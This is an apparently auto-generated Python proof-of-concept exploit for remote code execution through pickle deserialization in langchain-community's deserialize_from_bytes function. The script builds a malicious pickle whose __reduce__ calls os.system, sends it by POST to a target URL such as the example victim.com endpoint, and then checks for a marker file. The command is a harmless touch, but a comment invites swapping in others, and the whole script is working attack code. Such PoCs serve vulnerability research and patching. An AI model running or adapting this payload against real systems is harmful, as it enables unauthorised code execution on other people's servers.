#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-017
# Sink: deserialize_from_bytes
# Auto-generated — run with: python3 rce_function_deserialize_bytes_directly_deserialize_from_bytes_7.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE via pickle deserialization in
langchain-community's `deserialize_from_bytes` function.

Vulnerability: The function calls `pickle.loads(serialized)` without any
validation, allowing arbitrary code execution during unpickling.

This script generates a malicious pickle payload that runs a benign command
(e.g., `touch /tmp/poc_success.txt`) and sends it to a target endpoint that
exposes the vulnerable function. The target is assumed to accept raw bytes
in the request body (e.g., via POST to `/api/v1/trigger`).

Usage:
    python poc.py --target http://victim.com:8000/api/v1/trigger
"""

import os
import sys
import time
import argparse
import pickle
import subprocess
import urllib.request
import urllib.error

# ----------------------------------------------------------------------
# 1. Define a class whose __reduce__ method returns a callable and args
#    that will be executed during unpickling.
# ----------------------------------------------------------------------
class Exploit:
    """Malicious pickle payload — executes a system command on unpickling."""
    def __reduce__(self):
        # Benign command: create a marker file. Change this to test other commands.
        cmd = "touch /tmp/poc_success.txt"
        return (os.system, (cmd,))

def create_malicious_pickle() -> bytes:
    """Serialize the Exploit object to a pickle byte stream."""
    return pickle.dumps(Exploit())

# ----------------------------------------------------------------------
# 2. Send payload to target and check for execution.
# ----------------------------------------------------------------------
def send_payload(target_url: str, payload: bytes) -> None:
    """POST the malicious pickle bytes to the target endpoint."""
    print(f"[*] Sending malicious pickle payload to {target_url}")
    req = urllib.request.Request(
        target_url,
        data=payload,
        headers={"Content-Type": "application/octet-stream"}
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            print(f"[+] Response status: {response.status}")
            # Try to read response body (may be truncated if code already executed)
            try:
                body = response.read().decode('utf-8', errors='replace')
                print(f"[+] Response body:\n{body[:500]}")
            except Exception:
                pass
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP error: {e.code} - {e.reason}")
        # Some servers may crash or return error after code execution; that's fine.
    except urllib.error.URLError as e:
        print(f"[!] Connection failed: {e.reason}")
        sys.exit(1)

def verify_exploit(file_path: str = "/tmp/poc_success.txt") -> bool:
    """Check if the marker file exists (indicates command execution)."""
    print(f"[*] Checking for marker file: {file_path}")
    time.sleep(1)  # Give the command time to run
    if os.path.exists(file_path):
        print("[+] Marker file found — command executed successfully!")
        return True
    else:
        print("[-] Marker file not found — exploit may have failed.")
        return False

# ----------------------------------------------------------------------
# 3. Main entry point.
# ----------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="RCE PoC for langchain-community deserialize_from_bytes"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target URL (e.g., http://victim.com:8000/api/v1/trigger)"
    )
    args = parser.parse_args()

    # Step 1: Generate malicious pickle bytes
    print("[*] Generating malicious pickle payload (benign: touch /tmp/poc_success.txt)")
    malicious_bytes = create_malicious_pickle()
    print(f"[*] Payload size: {len(malicious_bytes)} bytes")

    # Step 2: Send payload
    send_payload(args.target, malicious_bytes)

    # Step 3: Verify execution
    verify_exploit()

if __name__ == "__main__":
    main()
